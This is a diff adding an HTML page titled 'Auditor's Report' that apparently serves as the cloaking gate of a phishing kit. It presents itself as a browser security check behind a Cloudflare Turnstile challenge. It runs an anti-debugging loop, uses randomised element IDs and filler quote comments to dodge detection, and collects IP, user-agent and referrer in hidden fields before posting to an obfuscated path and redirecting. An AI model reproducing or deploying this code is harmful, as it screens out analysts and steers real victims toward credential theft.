@@ -1,0 +1,105 @@
+<head>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auditor's Report</title>
+    <style>
+body {
+  background-color: #fff;
+  height: 100%;
+  overflow: hidden;
+}
+#ZrbQZWOQEH h4{margin-top:0;margin-bottom:.5rem;font-weight:500;line-height:1.2;}
+#ZrbQZWOQEH h4{font-size:calc(1.3);}
+@media (min-width:1200px){
+#ZrbQZWOQEH h4{font-size:1.5rem;}
+}
+#ZrbQZWOQEH p{margin-top:0;margin-bottom:1rem;}
+#ZrbQZWOQEH.container{width: 100%;padding-right: var(--bs-gutter-x, .75rem);padding-left: var(--bs-gutter-x, .75rem);margin-right: auto;margin-left: auto;}
+#ZrbQZWOQEH .text-center {text-align: center!important;}
+@media (min-width:992px){
+#ZrbQZWOQEH .col-lg-4{flex:0 0 auto;width:33.33333333%;}
+}
+#ZrbQZWOQEH .display-4 {font-size: 1.25rem!important;}
+#ZrbQZWOQEH .mt-2 {margin-top: 0.5rem!important;}
+#ZrbQZWOQEH .h4 {font-size: calc(.900rem + .3vw);}
+#ZrbQZWOQEH .justify-content-center{justify-content:center!important;}
+#ZrbQZWOQEH.mt-5{margin-top:3rem!important;}
+#ZrbQZWOQEH .mt-4 {margin-top: 1rem!important;}
+#ZrbQZWOQEH #UtOgtHpplT {color: #6c757d;font-size:14px;margin-top: .5rem;}
+    </style>
+<!-- The successful warrior is the average man, with laser-like focus. -->
+    <script>
+    setInterval(() => {
+    const t0 = Date.now();
+    eval('debugger');
+    const t1 = Date.now();
+    }, 1000);
+    </script>
+<!-- The only place where success comes before work is in the dictionary. -->
+</head><body style="font-family: arial, sans-serif;background-color: #fff;color: #000;padding: 20px;font-size: 18px;overscroll-behavior: contain;">
+<!-- Success is not how high you have climbed, but how you make a positive difference to the world. -->
+<div id="ZrbQZWOQEH" class="container">
+<div id="icpQJgLSCb" class="row justify-content-center">
+<div class="text-center">
+<!-- Success is not in what you have, but who you are. -->
+<form id="HFHBzPGzpZ">
+<div class="cf_turnstile" id="cf"><iframe src="https://challenges.cloudflare.com/cdn-cgi/challenge-platform/h/g/turnstile/if/ov2/av0/rcv0/0/uq6c8/0x4AAAAAAAeIAyMxtqEKlN0x/auto/normal" allow="cross-origin-isolated; fullscreen; autoplay" sandbox="allow-same-origin allow-scripts allow-popups" id="cf-chl-widget-uq6c8" tabindex="0" title="Widget containing a Cloudflare security challenge" style="border: none; overflow: hidden; width: 300px; height: 65px;"></iframe><input type="hidden" name="cf-turnstile-response" id="cf-chl-widget-uq6c8_response"></div>
+<input type="hidden" id="pagelink" name="pagelink" value="">
+<input type="hidden" id="bltdip" name="bltdip" value="Unknown">
+<!-- Success is not in what you have, but who you are. -->
+<input type="hidden" id="bltdref" name="bltdref" value="https://superlativehypercars.com/">
+<input type="hidden" id="bltdua" name="bltdua" value="Unknown">
+<input type="hidden" id="bltddata" name="bltddata" value="">
+<!-- If you really look closely, most overnight successes took a long time. -->
+</form>
+</div>
+<!-- <div>Success is not built on success. It&#039;s built on failure. It&#039;s built on frustration. Sometimes it&#039;s built on catastrophe.</div> -->
+<div class="text-center" id="UtOgtHpplT">
+Conducting security checks on your browser for protection.
+</div>
+<!-- Success is not built on success. It&#039;s built on failure. It&#039;s built on frustration. Sometimes it&#039;s built on catastrophe. -->
+
+</div>
+</div>
+
+<!-- <div>Don&#039;t watch the clock; do what it does. Keep going.</div> -->
+<script>
+turnstile.render('#cf', {
+    sitekey: '0x4AAAAAAAeIAyMxtqEKlN0x',
+    'error-callback': NENfzKEHnF,
+    callback: nPSjUqasEO,
+});
+function NENfzKEHnF() {
+    turnstile.reset();
+}
+function nPSjUqasEO() {
+var DkujDHScRf = document.getElementById("HFHBzPGzpZ");
+DkujDHScRf.onsubmit = function (event) {
+    event.preventDefault();
+};
+document.getElementById("pagelink").value = 'jAJGn';
+var xwIgqOfhVo = "../sdHj3OKkOhv2tq5VLatsyzER8pOzdxn";
+    fetch(xwIgqOfhVo, {
+        method: "POST",
+        body: new FormData(DkujDHScRf)
+    }).then(response => {
+        return response.json();
+    }).then(data => {
+        if(data['status'] == 'success'){
+        location.reload();
+        }
+        if(data['status'] == 'error'){
+        window.location.href = '/ICCNPKMZETARURWKCSCUCTGUXUJKMJBFSIDMSDJQSRVgpYq4hl6VliPk4FpMGoyrekmdsylrka?qhywdhcLFISEZXGZCQDNKRPIPZXIDFILWWDUCXRAUOLRDPOHCWPbfisryxfkhruamukuuuivctnbedirzfsfhynpepzskv';
+        }
+    });
+}
+</script>
+
+<!-- <div>Success usually comes to those who are too busy to be looking for it.</div> -->
+
+
+</body>
